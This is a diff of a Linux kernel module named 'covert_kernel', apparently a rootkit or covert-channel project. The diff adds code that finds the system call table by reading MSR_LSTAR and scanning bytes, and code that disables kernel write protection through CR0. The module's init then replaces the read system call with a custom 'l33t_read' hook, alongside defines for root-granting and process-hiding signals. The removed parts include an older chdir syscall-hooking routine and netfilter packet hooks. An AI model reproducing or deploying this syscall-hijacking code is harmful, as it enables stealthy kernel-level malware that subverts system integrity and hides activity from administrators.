@@ -1,30 +1,27 @@
+#include <asm/delay.h>
+#include <asm/errno.h>
+#include <asm/proto.h>
+#include <asm/unistd.h>
+#include <linux/fs.h>
+#include <linux/highmem.h>
 #include <linux/init.h>
 #include <linux/ip.h>
 #include <linux/kernel.h>
 #include <linux/kthread.h>
+#include <linux/mman.h>
 #include <linux/module.h>
 #include <linux/net.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
+#include <linux/sched.h>
 #include <linux/skbuff.h>
 #include <linux/slab.h>
+#include <linux/syscalls.h>
 #include <linux/tcp.h>
 #include <linux/types.h>
 #include <linux/udp.h>
 #include <linux/un.h>
 #include <net/sock.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/fs.h>
-#include <linux/syscalls.h>
-#include <asm/errno.h>
-#include <asm/unistd.h>
-#include <linux/mman.h>
-#include <asm/proto.h>
-#include <asm/delay.h>
-#include <linux/init.h>
-#include <linux/highmem.h>
-#include <linux/sched.h>
 
 #include "shared.h"
 
@@ -61,6 +58,7 @@ const char* encrypt_sock_path = "/var/run/covert_module_encrypt";
 const char* decrypt_sock_path = "/var/run/covert_module_decrypt";
 const char* tls_sock_path = "/var/run/covert_module_tls";
 
+#if 0
 int send_msg(struct socket* sock, unsigned char* buf, size_t len);
 int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
 int start_transmit(void);
@@ -467,6 +465,7 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
     }
     return NF_ACCEPT;
 }
+#endif
 
 #define SIGROOT 48
 #define SIGHIDEPROC 49
@@ -492,7 +491,7 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
         (char*) p; \
     })
 
-static unsigned long* sct;
+static void** sct;
 atomic_t read_on;
 
 #define VFS_READ \
@@ -539,6 +538,48 @@ struct ksym {
     unsigned long addr;
 };
 
+/*
+ * from: http://bw0x00.blogspot.de/2011/03/find-syscalltable-in-linux-26.html
+ */
+unsigned long** get_syscalltable(void) {
+    int i, lo, hi;
+    unsigned char* ptr;
+    unsigned long system_call;
+
+    alert("GETTING SYS_CALL_TABLE");
+
+    /* http://wiki.osdev.org/Inline_Assembly/Examples#RDMSR */
+    asm volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(MSR_LSTAR));
+    system_call = (unsigned long) (((long) hi << 32) | lo);
+
+    /* loop until first 3 bytes of instructions are found */
+    for (ptr = (unsigned char*) system_call, i = 0; i < 500; i++) {
+        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
+            debug("SYS_CALL_TABLE FOUND");
+            /* set address together */
+            return (unsigned long**) (0xffffffff00000000 | *((unsigned int*) (ptr + 3)));
+        }
+
+        ptr++;
+    }
+
+    debug("SYS_CALL_TABLE NOT FOUND");
+
+    return NULL;
+}
+
+/* disable page protection */
+void disable_page_protection(void) {
+    alert("DISABLE_PAGE_PROTECTION");
+    write_cr0(read_cr0() & (~0x10000));
+}
+
+/* enable page protection */
+void enable_page_protection(void) {
+    alert("ENABLE_PAGE_PROTECTION");
+    write_cr0(read_cr0() | 0x10000);
+}
+
 asmlinkage ssize_t l33t_read(unsigned int fd, char __user* buf, size_t count) {
     struct file* f;
     int fput_needed;
@@ -573,69 +614,6 @@ asmlinkage ssize_t l33t_read(unsigned int fd, char __user* buf, size_t count) {
     return ret;
 }
 
-void* memmem(const void* haystack, size_t haystack_size, const void* needle, size_t needle_size) {
-    char* p;
-
-    for (p = (char*) haystack; p <= ((char*) haystack - needle_size + haystack_size); p++) {
-        printk(KERN_INFO "sct offset pointer %p\n", (void*) p);
-        if (memcmp(p, needle, needle_size) == 0)
-            return (void*) p;
-    }
-    return NULL;
-}
-
-asmlinkage long (*real_chdir)(const char __user* filename);
-
-void** syscall_table;
-asmlinkage long chdir_patch(const char __user* filename) {
-    printk("Oh!\n");
-    return (*real_chdir)(filename);
-}
-
-unsigned long** find_syscall_table(void) {
-    unsigned long** table;
-    unsigned long ptr;
-
-    for (ptr = 0xc0000000; ptr <= 0xd0000000; ptr += sizeof(void*)) {
-        table = (unsigned long**) ptr;
-        if (table[__NR_close] == (unsigned long*) sys_close) {
-            return &(table[0]);
-        }
-    }
-    printk("Not found\n");
-    return NULL;
-}
-int __init chdir_init(void) {
-    unsigned int l;
-    pte_t* pte;
-    syscall_table = (void**) find_syscall_table();
-    if (syscall_table == NULL) {
-        printk(KERN_ERR "Syscall table is not found\n");
-        return -1;
-    }
-    printk("Syscall table found: %p\n", syscall_table);
-    pte = lookup_address((long unsigned int) syscall_table, &l);
-    pte->pte |= _PAGE_RW;
-    real_chdir = syscall_table[__NR_chdir];
-    syscall_table[__NR_chdir] = chdir_patch;
-    printk("Patched!\nOLD :%p\nIN-TABLE:%p\nNEW:%p\n", real_chdir, syscall_table[__NR_open],
-            chdir_patch);
-    return 0;
-}
-
-void __exit chdir_cleanup(void) {
-    unsigned int l;
-    pte_t* pte;
-    syscall_table[__NR_chdir] = real_chdir;
-    pte = lookup_address((long unsigned int) syscall_table, &l);
-    pte->pte &= ~_PAGE_RW;
-    printk("Exit\n");
-    return;
-}
-
-module_init(chdir_init);
-module_exit(chdir_cleanup);
-
 #if 0
 unsigned long* find_sys_call_table(void) {
     unsigned long sct_off = 0;
@@ -662,114 +640,42 @@ unsigned long* find_sys_call_table(void) {
     }
     return NULL;
 }
+#endif
 
 static int __init mod_init(void) {
     int err;
 
-    sct = (unsigned long*) find_sys_call_table();
+    sct = (void**) get_syscalltable();
 
-    printk(KERN_INFO "Kernel syscall table address %p\n", (void*) sct);
-    printk(KERN_INFO "old read value %d\n", __NR_read);
-    printk(KERN_INFO "old read address %p\n", (void*) *sct);
-    printk(KERN_INFO "old read address %p\n", (void*) sct[__NR_read]);
+    //printk(KERN_INFO "Kernel syscall table address %p\n", sct);
+    //printk(KERN_INFO "old read value %d\n", __NR_read);
+    //printk(KERN_INFO "old read address %p\n", *sct);
+    //printk(KERN_INFO "old read address %p\n", sct[__NR_read]);
 
+    printk(KERN_INFO "Pre save read\n");
     o_read = (void*) sct[__NR_read];
+    printk(KERN_INFO "Post save read\n");
 
     printk(KERN_INFO "Pre write cr0\n");
 
-    write_cr0(read_cr0() & (~0x10000));
+    disable_page_protection();
     printk(KERN_INFO "Post write cr0\n");
     printk(KERN_INFO "Pre read assign\n");
-    sct[__NR_read] = (unsigned long) l33t_read;
+    sct[__NR_read] = (int*) l33t_read;
     printk(KERN_INFO "Post read assign\n");
     printk(KERN_INFO "Pre rewrite cr0\n");
-    write_cr0(read_cr0() | 0x10000);
+    enable_page_protection();
     printk(KERN_INFO "Post rewrite cr0\n");
-
-    return 0;
-
-    memset(&seq_history, 0, sizeof(struct seqack) * 10);
-
-    nfhi.hook = incoming_hook;
-    nfhi.hooknum = NF_INET_LOCAL_IN;
-    nfhi.pf = PF_INET;
-    //Set hook highest priority
-    nfhi.priority = NF_IP_PRI_FIRST;
-    nf_register_net_hook(&init_net, &nfhi);
-
-    memcpy(&nfho, &nfhi, sizeof(struct nf_hook_ops));
-    nfho.hook = outgoing_hook;
-    nfho.hooknum = NF_INET_LOCAL_OUT;
-
-    nf_register_net_hook(&init_net, &nfho);
-
-    svc = kmalloc(sizeof(struct service), GFP_KERNEL);
-    if ((err = init_userspace_conn()) < 0) {
-        printk(KERN_ALERT "Failed to initialize userspace sockets; error code %d\n", err);
-        kfree(svc);
-
-        nf_unregister_net_hook(&init_net, &nfho);
-        nf_unregister_net_hook(&init_net, &nfhi);
-
-        return err;
-    }
-    buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
-    encrypted_test_data = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
-
-    //Get the encrypted version of my test data
-    strcpy(buffer, test_data);
-    send_msg(svc->encrypt_socket, buffer, strlen(test_data));
-    recv_msg(svc->encrypt_socket, encrypted_test_data, strlen(test_data) + OVERHEAD_LEN + 4);
-
-    data_len = strlen(test_data) + OVERHEAD_LEN + 4;
-
-    printk(KERN_INFO "Data length %zu\n", data_len);
-
-    svc->thread = kthread_run((void*) start_transmit, NULL, "packet_send");
-    printk(KERN_ALERT "covert_kernel module loaded\n");
 
     return 0;
 }
 
 static void __exit mod_exit(void) {
-    write_cr0(read_cr0() & (~0x10000));
-    sct[__NR_read] = (unsigned long) o_read;
-    write_cr0(read_cr0() | 0x10000);
-    return;
-    nf_unregister_net_hook(&init_net, &nfho);
-    nf_unregister_net_hook(&init_net, &nfhi);
-
-    if (svc) {
-#if 0
-        if (svc->remote_socket) {
-            //kernel_sock_shutdown(svc->remote_socket, SHUT_RDWR);
-            sock_release(svc->remote_socket);
-            printk(KERN_INFO "release remote socket\n");
-        }
-#endif
-        if (svc->encrypt_socket) {
-            sock_release(svc->encrypt_socket);
-            printk(KERN_INFO "release encrypt_socket\n");
-        }
-        if (svc->decrypt_socket) {
-            sock_release(svc->decrypt_socket);
-            printk(KERN_INFO "release decrypt_socket\n");
-        }
-        if (svc->tls_socket) {
-            sock_release(svc->tls_socket);
-            printk(KERN_INFO "release tls_socket\n");
-        }
-        kfree(svc);
-    }
-
-    if (buffer) {
-        kfree(buffer);
-    }
-    if (encrypted_test_data) {
-        kfree(encrypted_test_data);
-    }
-
+    disable_page_protection();
+    sct[__NR_read] = (int*) o_read;
+    enable_page_protection();
     printk(KERN_ALERT "removed covert_kernel module\n");
+    return;
 }
 
 module_init(mod_init);
